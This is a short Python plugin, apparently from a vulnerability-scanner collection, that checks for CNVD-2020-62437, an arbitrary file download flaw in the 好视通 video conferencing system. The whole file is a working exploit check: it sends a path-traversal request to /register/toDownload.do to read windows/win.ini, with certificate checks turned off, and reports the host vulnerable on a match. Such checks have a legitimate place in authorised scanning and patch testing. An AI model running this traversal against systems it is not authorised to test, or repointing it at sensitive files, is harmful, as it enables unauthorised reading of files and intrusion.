#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {}
  ret['links'] = 'https://peiqi.wgpsec.org/wiki/webapp/银澎云计算/银澎云计算 好视通视频会议系统 任意文件下载 CNVD-2020-62437.html'
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "银澎云计算 好视通视频会议系统 任意文件下载 CNVD-2020-62437"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target = "/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "for 16-bit app support" in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret